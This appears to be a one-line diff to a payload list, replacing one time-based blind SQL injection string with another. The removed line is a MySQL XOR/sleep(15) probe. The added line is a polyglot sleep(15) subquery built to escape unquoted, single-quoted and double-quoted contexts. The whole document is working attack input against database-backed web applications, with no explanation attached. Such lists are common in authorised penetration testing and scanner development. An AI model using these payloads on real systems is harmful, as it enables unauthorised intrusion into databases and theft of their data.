@@ -1,1 +1,1 @@
-5550"XOR(555*if(now()=sysdate(),sleep(15),0))XOR"Z
+(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
